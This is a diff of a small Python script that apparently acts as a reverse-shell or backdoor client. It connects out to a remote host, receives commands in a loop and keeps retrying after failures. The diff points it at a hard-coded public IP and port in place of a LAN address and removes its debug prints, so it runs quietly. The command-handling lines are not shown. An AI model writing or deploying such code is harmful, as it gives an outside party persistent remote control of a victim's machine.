@@ -1,11 +1,10 @@
 import socket
 import os
 import time
-host = "192.168.1.34"
 while True:
     try:
         sock = socket.socket()
-        sock.connect((host, 8080))
+        sock.connect(("109.169.239.111", 9494))
         while True:
             try:
                 data = sock.recv(1024).decode()  # получаем команду
@@ -19,7 +18,5 @@ while True:
             except:
                 break
     except:
-        print ("EXCEPT!")
         time.sleep(25)
-        print ("TRYING!")
         continue
